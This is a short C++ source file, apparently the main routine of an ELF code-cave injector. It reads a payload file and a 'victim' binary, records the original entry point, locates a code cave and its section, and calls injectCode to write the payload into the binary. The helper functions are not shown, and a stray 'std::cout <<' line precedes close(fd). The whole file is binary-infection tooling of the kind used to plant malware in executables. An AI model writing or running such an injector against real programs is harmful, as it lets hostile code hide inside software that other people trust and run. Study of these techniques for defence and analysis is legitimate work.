#include <iostream>
#include "utils/utils.h"
#include <fstream>
#include <iterator>

int main(int argc, char **argv) {

    std::ifstream input( argc == 3 ? argv[2] : "../../test/payload", std::ios::binary );

    std::vector<unsigned char> payload(std::istreambuf_iterator<char>(input), {});

    int fd = open(argc == 3 ? argv[1] : "../../test/victim", O_RDWR);

    Elf64_Ehdr ehdr;
    read(fd, &ehdr, sizeof(ehdr));
    auto entryPoint = ehdr.e_entry;
//    std::cout << "Old entry point: " << std::hex << ehdr.e_entry << std::endl;

    // get code cave
    code_cave_t cc = findCodeCave(fd);
//    std::cout << "Code cave start: " << cc.start << " Code cave end: " << cc.end << std::endl;

    // get image base
    int imgBase = getImageBase(fd, ehdr);
    cc.start += imgBase;
    cc.end += imgBase;

//    std::cout << std::dec << "Image base: " << imgBase << std::endl;

    // find section of the code cave
    int secNum = findSectionNum(fd, cc.start, cc.end);
//    std::cout << "Section number of the Code cave: " << secNum << std::endl;

    // TODO: find needed segment and make it executable; edit: impossible. Solution: check if section is executable

//    makeAllExec(fd);

    // inject code
    injectCode(fd, cc, entryPoint, ehdr, imgBase, payload);
    std::cout <<
    close(fd);

    return 0;
}
